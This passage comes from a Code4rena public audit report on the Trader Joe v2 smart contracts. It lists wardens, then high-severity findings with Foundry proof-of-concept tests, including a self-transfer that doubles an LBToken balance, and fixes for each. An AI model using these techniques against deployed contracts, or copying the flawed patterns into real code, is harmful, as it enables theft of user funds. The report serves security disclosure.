<code>LBRouter.sol</code></a></li>\n<li><a href=\"#l-02-potential-loss-of-funds-on-tokens-with-big-supplies\">L-02 Potential loss of funds on tokens with big supplies</a></li>\n<li><a href=\"#l-03-in-tokenhelpersol-the-safetransfer-function-does-not-check-for-potentially-self-destroyed-tokens\">L-03 In <code>TokenHelper.sol</code> the <code>safeTransfer</code> function does not check for potentially self-destroyed tokens.</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#g-01-owner-token-enumeration-is-an-extremely-expensive-operation-but-it-is-not-essential-to-the-protocol\">G-01 Owner token enumeration is an extremely expensive operation but it is not essential to the protocol</a></li>\n<li><a href=\"#g-02-using-solidity-version-0817-will-provide-an-overall-gas-optimization\">G-02 Using Solidity version 0.8.17 will provide an overall gas optimization</a></li>\n<li><a href=\"#g-03-ternary-operation-is-cheaper-than-if-else-statement\">G-03 Ternary operation is cheaper than if-else statement</a></li>\n<li><a href=\"#g-04-checking-msgsender-to-not-be-zero-address-is-redundant\">G-04 Checking <code>msg.sender</code> to not be zero address is redundant</a></li>\n<li><a href=\"#g-05-an-element-is-cached-to-memory-after-it-is-used\">G-05 An element is cached to memory after it is used</a></li>\n<li><a href=\"#g-06-divisions-by-2n-can-be-replaced-by-right-shift-by-n\">G-06 Divisions by <code>2**n</code> can be replaced by right shift by <code>n</code></a></li>\n<li><a href=\"#g-07-runtime-cost-can-be-optimized-in-detriment-of-the-deploy-cost\">G-07 Runtime cost can be optimized in detriment of the deploy cost</a></li>\n<li><a href=\"#g-08-making-constant-variables-private-will-save-gas-during-deployment\">G-08 Making constant variables private will save gas during deployment</a></li>\n<li><a href=\"#g-09-using-bools-for-storage-incurs-overhead\">G-09 Using <code>bool</code>s for storage incurs overhead</a></li>\n<li><a href=\"#g10-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\">G‑10 Functions guaranteed to revert when called by normal users can be marked <code>payable</code></a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>",
  "md": "\n# Overview\n\n## About C4\n\nCode4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.\n\nA C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\n\nDuring the audit contest outlined in this document, C4 conducted an analysis of the Trader Joe v2 smart contract system written in Solidity. The audit contest took place between October 14—October 23 2022.\n\n## Wardens\n\n83 Wardens contributed reports to the Trader Joe v2 contest:\n\n  1. 0x1f8b\n  2. 0x4non\n  3. 0x52\n  4. [0xSmartContract](https://twitter.com/0xSmartContract)\n  5. [8olidity](https://twitter.com/8olidity)\n  6. [Aymen0909](https://github.com/Aymen1001)\n  7. [Dravee](https://twitter.com/BowTiedDravee)\n  8. [ElKu](https://twitter.com/ElKu_crypto)\n  9. IllIllI\n  10. [JMukesh](https://twitter.com/MukeshJ_eth)\n  11. [Jeiwan](https://jeiwan.net)\n  12. Josiah\n  13. KIntern\\_NA (TrungOre and duc)\n  14. KingNFT\n  15. Lambda\n  16. LeoS\n  17. M4TZ1P ([DekaiHako](https://twitter.com/huna38699), holyhansss_kr, [Zer0Luck](https://twitter.com/younsle1), AAIIWITF, and [exd0tpy](https://github.com/exd0tpy))\n  18. Mathieu\n  19. [MiloTruck](https://milotruck.github.io/)\n  20. Mukund\n  21. [Nyx](https://twitter.com/Nyksx__)\n  22. [Rahoz](https://www.linkedin.com/in/nhan-vo-a9473019a/)\n  23. [Randyyy](https://twitter.com/randyyramadhan)\n  24. RaoulSchaffranek\n  25. ReyAdmirado\n  26. Rolezn\n  27. RustyRabbit\n  28. SEVEN\n  29. Saintcode\\_\n  30. Shishigami\n  31. SooYa\n  32. The\\_GUILD ([David\\_](https://twitter.com/davidpius10), [Ephraim](https://twitter.com/iamephraim_js), LeoGold, and greatsamist)\n  33. [TomJ](https://mobile.twitter.com/tomj_bb)\n  34. [Trust](https://twitter.com/trust__90)\n  35. [Tutturu](https://twitter.com/TuturuTech)\n  36. \\_\\_141345\\_\\_\n  37. [adriro](https://github.com/romeroadrian)\n  38. bctester\n  39. bitbopper\n  40. brgltd\n  41. [c3phas](https://twitter.com/c3ph_)\n  42. [catchup](https://twitter.com/catchup22)\n  43. cccz\n  44. chaduke\n  45. [csanuragjain](https://twitter.com/csanuragjain)\n  46. d3e4\n  47. djxploit\n  48. [hansfriese](https://twitter.com/hansfriese)\n  49. hxzy\n  50. [hyh](https://twitter.com/0xhyh)\n  51. imare\n  52. immeas\n  53. [indijanc](https://twitter.com/krenkmet)\n  54. ladboy233\n  55. leosathya\n  56. lukris02\n  57. [m\\_Rassska](https://t.me/Road220)\n  58. ne0n\n  59. neumo\n  60. [parashar](https://twitter.com/ankitparashar)\n  61. pashov\n  62. [pfapostol](https://t.me/pfahard)\n  63. [phaze](https://twitter.com/lovethewired)\n  64. [philogy](https://twitter.com/real_philogy)\n  65. rbserver\n  66. rvierdiiev\n  67. saian\n  68. sha256yan\n  69. [shung](https://twitter.com/shunduquar)\n  70. sorrynotsorry\n  71. [supernova](https://twitter.com/harshit16024263)\n  72. vv7\n  73. wagmi\n  74. zzykxx\n  75. zzzitron\n\nThis contest was judged by [Alex the Entreprenerd](https://twitter.com/GalloDaSballo).\n\nFinal report assembled by [liveactionllama](https://twitter.com/liveactionllama).\n\n# Summary\n\nThe C4 analysis yielded an aggregated total of 12 unique vulnerabilities. Of these vulnerabilities, 5 received a risk rating in the category of HIGH severity and 7 received a risk rating in the category of MEDIUM severity.\n\nAdditionally, C4 analysis included 11 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 14 reports recommending gas optimizations.\n\nAll of the issues presented here are linked back to their original finding.\n\n# Scope\n\nThe code under review can be found within the [C4 Trader Joe v2 contest repository](https://github.com/code-423n4/2022-10-traderjoe), and is composed of 26 smart contracts written in the Solidity programming language and includes 4,598 lines of Solidity code.\n\n# Severity Criteria\n\nC4 assesses the severity of disclosed vulnerabilities according to a methodology based on [OWASP standards](https://owasp.org/www-community/OWASP_Risk_Rating_Methodology).\n\nVulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.\n\nHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\n\n- Malicious Input Handling\n- Escalation of privileges\n- Arithmetic\n- Gas use\n\nFurther information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com).\n\n# High Risk Findings (5)\n## [[H-01] Transfering funds to yourself increases your balance](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/299)\n*Submitted by [Dravee](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/299), also found by [bitbopper](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/496), [hansfriese](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/441), [saian](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/422), [Tutturu](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/391), [JMukesh](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/288), [\\_\\_141345\\_\\_](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/284), [neumo](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/266), [parashar](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/223), [Randyyy](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/221), [phaze](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/204), [hxzy](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/128), [Lambda](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/107), [cccz](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/48), [SEVEN](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/46), [ne0n](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/20), [8olidity](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/12), and [RaoulSchaffranek](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/8)*\n\n<https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L182><br>\n<https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L187><br>\n<https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L189-L192><br>\n\nUsing temporary variables to update balances is a dangerous construction that has led to several hacks in the past. Here, we can see that `_toBalance` can overwrite `_fromBalance`:\n\n```solidity\nFile: LBToken.sol\n176:     function _transfer(\n177:         address _from,\n178:         address _to,\n179:         uint256 _id,\n180:         uint256 _amount\n181:     ) internal virtual {\n182:         uint256 _fromBalance = _balances[_id][_from];\n...\n187:         uint256 _toBalance = _balances[_id][_to];\n188: \n189:         unchecked {\n190:             _balances[_id][_from] = _fromBalance - _amount;\n191:             _balances[_id][_to] = _toBalance + _amount; //@audit : if _from == _to : rekt\n192:         }\n..\n196:     }\n```\n\nFurthermore, the `safeTransferFrom` function has the `checkApproval` modifier which passes without any limit if `_owner == _spender` :\n\n```solidity\nFile: LBToken.sol\n32:     modifier checkApproval(address _from, address _spender) {\n33:         if (!_isApprovedForAll(_from, _spender)) revert LBToken__SpenderNotApproved(_from, _spender);\n34:         _;\n35:     }\n...\n131:     function safeTransferFrom(\n...\n136:     ) public virtual override checkAddresses(_from, _to) checkApproval(_from, msg.sender) {\n...\n269:     function _isApprovedForAll(address _owner, address _spender) internal view virtual returns (bool) {\n270:         return _owner == _spender || _spenderApprovals[_owner][_spender];\n271:     }\n```\n\n### Proof of Concept\n\nAdd the following test to `LBToken.t.sol` (run it with `forge test --match-path test/LBToken.t.sol --match-test testSafeTransferFromOneself -vvvv`):\n\n```solidity\n    function testSafeTransferFromOneself() public {\n        uint256 amountIn = 1e18;\n\n        (uint256[] memory _ids, , , ) = addLiquidity(amountIn, ID_ONE, 5, 0);\n\n        uint256 initialBalance = pair.balanceOf(DEV, _ids[0]);\n\n        assertEq(initialBalance, 333333333333333333); // using hardcoded value to ease understanding\n\n        pair.safeTransferFrom(DEV, DEV, _ids[0], initialBalance); //transfering to oneself\n        uint256 rektBalance1 = pair.balanceOf(DEV, _ids[0]); //computing new balance\n        assertEq(rektBalance1, 2 * initialBalance); // the new balance is twice the initial one\n        assertEq(rektBalance1, 666666666666666666); // using hardcoded value to ease understanding\n    }\n```\n\nAs we can see here, this test checks that transfering all your funds to yourself doubles your balance, and it's passing. This can be repeated again and again to increase your balance.\n\n### Recommended Mitigation Steps\n\n*   Add checks to make sure that `_from != _to` because that shouldn't be useful anyway\n*   Prefer the following:\n\n```solidity\nFile: LBToken.sol\n189:         unchecked {\n190:             _balances[_id][_from] -= _amount;\n191:             _balances[_id][_to] += _amount;\n192:         }\n```\n\n**[0x0Louis (Trader Joe) confirmed](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/299)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/299#issuecomment-1307892670):**\n > The Warden has shown how, due to the improper usage of a supporting temporary variable, balance duplication can be achieved.\n> \n> Mitigation will require ensuring that the intended variable is changed in storage, and the code offered by the warden should help produce a test case to compare the fix against.\n> \n> Because the finding pertains to duplication of balances, causing a loss for users, I agree with High Severity.\n\n\n\n***\n\n## [[H-02] Incorrect output amount calculation for Trader Joe V1 pools](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/345)\n*Submitted by [Jeiwan](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/345), also found by [KIntern\\_NA](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/401) and [cccz](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/90)*\n\n<https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L891><br>\n<https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L896><br>\n\nOutput amount is calculated incorrectly for a Trader Joe V1 pool when swapping tokens across multiple pools and some of the pools in the chain are V1 ones. Calculated amounts will always be smaller than expected ones, which will always affect chained swaps that include V1 pools.\n\n### Proof of Concept\n\n[LBRouter](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L21) is a high-level contract that serves as the main contract users will interact with. The contract implements a lot of security checks and helper functions that make usage of LBPair contracts easier and more user-friendly. Some examples of such functions:\n\n*   [swapExactTokensForTokensSupportingFeeOnTransferTokens](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L531), which makes chained swaps (i.e. swaps between tokens that don't have a pair) of tokens implementing fee on transfer (i.e. there's fee reduced from every transferred amount);\n*   [swapExactTokensForAVAXSupportingFeeOnTransferTokens](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L561), which is the variation of the above function which takes AVAX as the output token;\n*   [swapExactAVAXForTokensSupportingFeeOnTransferTokens](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L594), which is the variation of the previous function which takes AVA as the input token.\n\nUnder the hood, these three functions call [\\_swapSupportingFeeOnTransferTokens](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L864), which is the function that actually performs swaps. The function supports both Trader Joe V1 and V2 pools: when `_binStep` is 0 (which is never true in V2 pools), it's assumed that the current pool is a V1 one. For V1 pools, the function calculates output amounts based on pools' reserves and balances:\n\n```solidity\nif (_binStep == 0) {\n    (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();\n    if (_token < _tokenNext) {\n        uint256 _balance = _token.balanceOf(_pair);\n        uint256 _amountOut = (_reserve1 * (_balance - _reserve0) * 997) / (_balance * 1_000);\n\n        IJoePair(_pair).swap(0, _amountOut, _recipient, \"\");\n    } else {\n        uint256 _balance = _token.balanceOf(_pair);\n        uint256 _amountOut = (_reserve0 * (_balance - _reserve1) * 997) / (_balance * 1_000);\n\n        IJoePair(_pair).swap(_amountOut, 0, _recipient, \"\");\n    }\n} else {\n    ILBPair(_pair).swap(_tokenNext == ILBPair(_pair).tokenY(), _recipient);\n}\n```\n\nHowever, these calculations are incorrect. Here's the difference:\n\n```diff\n@@ -888,12 +888,14 @@ contract LBRouter is ILBRouter {\n                     (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();\n                     if (_token < _tokenNext) {\n                         uint256 _balance = _token.balanceOf(_pair);\n-                        uint256 _amountOut = (_reserve1 * (_balance - _reserve0) * 997) / (_balance * 1_000);\n+                        uint256 amountInWithFee = (_balance - _reserve0) * 997;\n+                        uint256 _amountOut = (_reserve1 * amountInWithFee) / (_reserve0 * 1_000 + amountInWithFee);\n\n                         IJoePair(_pair).swap(0, _amountOut, _recipient, \"\");\n                     } else {\n                         uint256 _balance = _token.balanceOf(_pair);\n-                        uint256 _amountOut = (_reserve0 * (_balance - _reserve1) * 997) / (_balance * 1_000);\n+                        uint256 amountInWithFee = (_balance - _reserve1) * 997;\n+                        uint256 _amountOut = (_reserve0 * amountInWithFee) / (_reserve1 * 1_000 + amountInWithFee);\n\n                         IJoePair(_pair).swap(_amountOut, 0, _recipient, \"\");\n                     }\n```\n\nThese calculations are implemented correctly in [JoeLibrary.getAmountOut](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/libraries/JoeLibrary.sol#L30-L41), which is used in [LBQuoter](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBQuoter.sol#L83).  Also it's used in Trader Joe V1 to calculate output amounts in similar functions:\n\n*   <https://github.com/traderjoe-xyz/joe-core/blob/main/contracts/traderjoe/JoeRouter02.sol#L375>\n\n```solidity\n// test/audit/RouterMath2.t.sol\n// SPDX-License-Identifier: UNLICENSED\n\npragma solidity ^0.8.7;\n\nimport \"../TestHelper.sol\";\n\nimport \"../../src/LBRouter.sol\";\nimport \"../../src/interfaces/IJoePair.sol\";\n\ncontract RouterMath2Test is TestHelper {\n    IERC20 internal token;\n    uint256 internal actualAmountOut;\n\n    function setUp() public {\n        token = new ERC20MockDecimals(18);\n        ERC20MockDecimals(address(token)).mint(address(this), 100e18);\n\n        router = new LBRouter(\n            ILBFactory(address(0x00)),\n            IJoeFactory(address(this)),\n            IWAVAX(address(0x02))\n        );\n    }\n\n    // Imitates V1 factory.\n    function getPair(address, /*tokenX*/ address /*tokenY*/ ) public view returns (address) {\n        return address(this);\n    }\n\n    // Imitates V1 pool.\n    function getReserves() public pure returns (uint112, uint112, uint32) {\n        return (1e18, 1e18, 0);\n    }\n\n    // Imitates V1 pool.\n    function balanceOf(address /*acc*/) public pure returns (uint256) {\n        return 0.0001e18;\n    }\n\n    // Imitates V1 pool.\n    function swap(uint256 amount0, uint256 amount1, address to, bytes memory data) public {\n        actualAmountOut = amount0 == 0 ? amount1 : amount0;\n    }\n\n    function testScenario() public {\n        // Setting up a swap via one V1 pool.\n        uint256[] memory steps = new uint256[](1);\n        steps[0] = 0;\n\n        IERC20[] memory path = new IERC20[](2);\n        path[0] = IERC20(address(token));\n        path[1] = IERC20(address(this));\n\n        uint256 amountIn = 0.0001e18;\n\n        token.approve(address(router), 1e18);\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            amountIn, 0, steps, path, address(this), block.timestamp + 1000\n        );\n        // This amount was calculated incorrectly.\n        assertEq(actualAmountOut, 987030000000000000); // Equals to 989970211528238869 when fixed.\n\n\n        address _pair = address(this);\n        uint256 expectedAmountOut;\n\n        // Reproduce the calculations using JoeLibrary.getAmountIn. This piece:\n        // https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L888-L899\n        (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();\n        if (address(token) < address(this)) {\n            uint256 _balance = token.balanceOf(_pair);\n            expectedAmountOut = JoeLibrary.getAmountOut(_balance - _reserve0, _reserve0, _reserve1);\n        } else {\n            uint256 _balance = token.balanceOf(_pair);\n            expectedAmountOut = JoeLibrary.getAmountOut(_balance - _reserve1, _reserve1, _reserve0);\n        }\n\n        // This is the correct amount.\n        assertEq(expectedAmountOut, 989970211528238869);\n\n        // The wrong amount is smaller than the expected one.\n        assertEq(expectedAmountOut - actualAmountOut, 2940211528238869);\n    }\n}\n```\n\n### Recommended Mitigation Steps\n\nConsider using the `JoeLibrary.getAmountOut` function in the `_swapSupportingFeeOnTransferTokens` function of `LBRouter` when computing output amounts for V1 pools.\n\n**[0x0Louis (Trader Joe) confirmed](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/345)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/345#issuecomment-1310464655):**\n > The warden has shown how, due to incorrect calculations, swaps routed through V1 functions may cause losses to end users.\n> \n> Because the issue is with a core mechanism of the protocol, and the warden has shown (via coded POC) how a loss can happen, I agree with High Severity.\n> \n> While this finding is similar to H-01, at this time I think it's different enough to keep it separate as the internals and code paths are distinct.\n\n\n\n***\n\n## [[H-03] Wrong implementation of function `LBPair.setFeeParameter` can break the funcionality of LBPair and make user's tokens locked ](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/384)\n*Submitted by [KIntern\\_NA](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/384), also found by [Trust](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/425) and [KingNFT](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/203)*\n\nStruct `FeeParameters` contains 12 fields as follows:\n\n```solidity\nstruct FeeParameters {\n    // 144 lowest bits in slot \n    uint16 binStep;\n    uint16 baseFactor;\n    uint16 filterPeriod; \n    uint16 decayPeriod; \n    uint16 reductionFactor; \n    uint24 variableFeeControl;\n    uint16 protocolShare;\n    uint24 maxVolatilityAccumulated; \n    \n    // 112 highest bits in slot \n    uint24 volatilityAccumulated;\n    uint24 volatilityReference;\n    uint24 indexRef;\n    uint40 time; \n}\n```\n\nFunction [`LBPair.setFeeParamters(bytes _packedFeeParamters)`](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L788-L790) is used to set the first 8 fields which was stored in 144 lowest bits of `LBPair._feeParameter`'s slot to 144 lowest bits of `_packedFeeParameters` (The layout of `_packedFeeParameters` can be seen [here](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L572-L584)).\n\n```solidity\n/// url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L905-L917\n\n/// @notice Internal function to set the fee parameters of the pair\n/// @param _packedFeeParameters The packed fee parameters\nfunction _setFeesParameters(bytes32 _packedFeeParameters) internal {\n    bytes32 _feeStorageSlot;\n    assembly {\n        _feeStorageSlot := sload(_feeParameters.slot)\n    }\n\n    /// [#explain]  it will get 112 highest bits of feeStorageSlot,\n    ///             and stores it in the 112 lowest bits of _varParameters \n    uint256 _varParameters \n        = _feeStorageSlot.decode(type(uint112).max, _OFFSET_VARIABLE_FEE_PARAMETERS/*=144*/);\n\n    /// [#explain]  get 144 lowest bits of packedFeeParameters \n    ///             and stores it in the 144 lowest bits of _newFeeParameters  \n    uint256 _newFeeParameters = _packedFeeParameters.decode(type(uint144).max, 0);\n\n    assembly {\n        // [$audit-high] wrong operation `or` here \n        //              Mitigate: or(_newFeeParameters, _varParameters << 144)    \n        sstore(_feeParameters.slot, or(_newFeeParameters, _varParameters))\n    }\n}\n```\n\nAs we can see in the implementation of `LBPair._setFeesParametes` above, it gets the 112 highest bits of `_feeStorageSlot` and stores it in the 112 lowest bits of `_varParameter`. Then it gets the 144 lowest bits of `packedFeeParameter` and stores it in the 144 lowest bits of `_newFeeParameters`.\n\nFollowing the purpose of function `setFeeParameters`, the new `LBPair._feeParameters` should form as follow:\n\n    // keep 112 highest bits remain unchanged \n    // set 144 lowest bits to `_newFeeParameter`\n    [...112 bits...][....144 bits.....]\n    [_varParameters][_newFeeParameters]\n\nIt will make `feeParameters = _newFeeParameters | (_varParameters << 144)`. But current implementation just stores the `or` value of `_varParameters` and `_newFeeParameter` into `_feeParameters.slot`. It forgot to shift left the `_varParameters` 144 bits before executing `or` operation.\n\nThis will make the value of `binStep`, ..., `maxVolatilityAccumulated` incorrect, and also remove the value (make the bit equal to 0) of `volatilityAccumulated`, ..., `time`.\n\n### Impact\n\n*   Incorrect fee calculation when executing an action with LBPair (swap, flashLoan, mint)\n*   Break the functionality of LBPair. The user can't swap/mint/flashLoan\n\n\\--> Make all the tokens stuck in the pools\n\n### Proof of concept\n\nHere is our test script to describe the impacts\n\n*   <https://gist.github.com/WelToHackerLand/012e44bb85420fb53eb0bbb7f0f13769>\n\nYou can place this file into `/test` folder and run it using\n\n```\nforge test --match-contract High1Test -vv\n```\n\nExplanation of test script:\n\n1.  First we create a pair with `binStep = DEFAULT_BIN_STEP = 25`\n2.  We do some actions (add liquidity -> mint -> swap) to increase the value of `volatilityAccumulated` from `0` to `60000`\n3.  We call function `factory.setFeeParametersOnPair` to set new fee parameters.\n4.  After that the value of `volatilityAccumulated` changed to value `0` (It should still be unchanged after `factory.setFeeParametersOnPair`)\n5.  We check the value of `binStep` and it changed from`25` to `60025`\n    *   `binStep` has that value because [line 915](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L915) set `binStep = uint16(volatilityAccumulated) | binStep = 60000 | 25 = 60025`.\n6.  This change of `binStep` value will break all the functionality of `LBPair` cause `binStep > Constant.BASIS_POINT_MAX = 10000` `-->` `Error: BinStepOverflows`\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nModify function `LBPair._setFeesParaters` as follow:\n\n```solidity\n/// url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L905-L917\nfunction _setFeesParameters(bytes32 _packedFeeParameters) internal {\n    bytes32 _feeStorageSlot;\n    assembly {\n        _feeStorageSlot := sload(_feeParameters.slot)\n    }\n\n\n    uint256 _varParameters = _feeStorageSlot.decode(type(uint112).max, _OFFSET_VARIABLE_FEE_PARAMETERS);\n    uint256 _newFeeParameters = _packedFeeParameters.decode(type(uint144).max, 0);\n\n\n    assembly {\n        sstore(_feeParameters.slot, or(_newFeeParameters, shl(144, _varParameters)))\n    }\n}\n```\n\n**[0x0Louis (Trader Joe) confirmed](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/384)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/384#issuecomment-1310455200):**\n > The warden has shown how, due to a missing shift, packed settings for `feeParameters` will be improperly stored, causing undefined behaviour.\n> \n> The mistake can be trivially fixed and the above code offers a test case for remediation.\n> \n> Because the finding impacts the protocol functionality, despite it's perceived simplicity, I agree with High Severity as the code is not working as intended in a fundamental way.\n\n\n\n***\n\n## [[H-04] Wrong calculation in function `LBRouter._getAmountsIn` make user lose a lot of tokens when swap through JoePair (most of them will gifted to JoePair freely)](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/400)\n*Submitted by [KIntern\\_NA](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/400), also found by [hansfriese](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/442), [Jeiwan](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/341), and [cccz](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/88)*\n\nFunction `LBRouter._getAmountsIn` is a helper function to return the amounts in with given `amountOut`. This function will check the pair of `_token` and `_tokenNext` is `JoePair` or `LBPair` using `_binStep`.\n\n*   If `_binStep == 0`, it will be a `JoePair` otherwise it will be an `LBPair`.\n\n```solidity\nif (_binStep == 0) {\n    (uint256 _reserveIn, uint256 _reserveOut, ) = IJoePair(_pair).getReserves();\n    if (_token > _tokenPath[i]) {\n        (_reserveIn, _reserveOut) = (_reserveOut, _reserveIn);\n    }\n\n\n    uint256 amountOut_ = amountsIn[i];\n    // Legacy uniswap way of rounding\n    amountsIn[i - 1] = (_reserveIn * amountOut_ * 1_000) / (_reserveOut - amountOut_ * 997) + 1;\n} else {\n    (amountsIn[i - 1], ) = getSwapIn(ILBPair(_pair), amountsIn[i], ILBPair(_pair).tokenX() == _token);\n}\n```\n\nAs we can see when `_binStep == 0` and `_token < _tokenPath[i]` (in another word  we swap through `JoePair` and pair's`token0` is `_token` and `token1` is `_tokenPath[i]`), it will\n\n1.  Get the reserve of pair (`reserveIn`, `reserveOut`)\n2.  Calculate the `_amountIn` by using the formula\n\n<!---->\n\n    amountsIn[i - 1] = (_reserveIn * amountOut_ * 1_000) / (_reserveOut - amountOut_ * 997) + 1\n\nBut unfortunately the denominator `_reserveOut - amountOut_ * 997` seem incorrect. It should be `(_reserveOut - amountOut_) * 997`.<br>\nWe will do some math calculations here to prove the expression above is wrong.\n\n**Input:**\n\n*   `_reserveIn (rIn)`: reserve of `_token` in pair\n*   `_reserveOut (rOut)`: reserve of `_tokenPath[i]` in pair\n*   `amountOut_`: the amount of `_tokenPath` the user wants to gain\n\n**Output:**\n\n*   `rAmountIn`: the actual amount of `_token` we need to transfer to the pair.\n\n**Generate Formula:**\n\nCause `JoePair` [takes 0.3%](https://help.traderjoexyz.com/en/welcome/faq-and-help/general-faq#what-are-trader-swap-joe-fees) of `amountIn` as fee, we get\n\n*   `amountInDeductFee = amountIn' * 0.997`\n\nFollowing the [constant product formula](https://docs.uniswap.org/protocol/V2/concepts/protocol-overview/glossary#constant-product-formula), we have\n```\n\n        rIn * rOut = (rIn + amountInDeductFee) * (rOut - amountOut_)\n    ==> rIn + amountInDeductFee = rIn * rOut / (rOut - amountOut_) + 1\n    <=> amountInDeductFee = (rIn * rOut) / (rOut - amountOut_) - rIn + 1\n    <=> rAmountIn * 0.997 = rIn * amountOut / (rOut - amountOut_) + 1\n    <=> rAmountIn = (rIn * amountOut * 1000) / ((rOut - amountOut_) * 997) + 1\n    <=> \n```\n\nAs we can see `rAmountIn` is different from `amountsIn[i - 1]`, the denominator of `rAmountIn` is `(rOut - amountOut_) * 997` when the denominator of `amountsIn[i - 1]` is `_reserveOut - amountOut_ * 997` (Missing one bracket)\n\n### Impact\n\n**Loss of fund: User will send a lot of tokenIn (much more than expected) but just gain exact amountOut in return.**\n\nLet dive in the function `swapTokensForExactTokens()` to figure out why this scenario happens. I will assume I just swap through only one pool from `JoePair` and 0 pool from `LBPair`.\n\n*   Firstly function will get the list `amountsIn` from function `_getAmountsIn`. So `amountsIn` will be \\[`incorrectAmountIn`, `userDesireAmount`].\n    ```solidity\n    // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L440\n    amountsIn = _getAmountsIn(_pairBinSteps, _pairs, _tokenPath, _amountOut);\n    ```\n*   Then it transfers `incorrectAmountIn` to `_pairs[0]` to prepare for the swap.\n    ```solidity\n    // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L444\n    _tokenPath[0].safeTransferFrom(msg.sender, _pairs[0], amountsIn[0]);\n    ```\n*   Finally it calls function `_swapTokensForExactToken` to execute the swap.\n    ```solidity\n    // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L446    \n    uint256 _amountOutReal = _swapTokensForExactTokens(_pairs, _pairBinSteps, _tokenPath, amountsIn, _to);\n    ```\n    In this step it will reach to [line 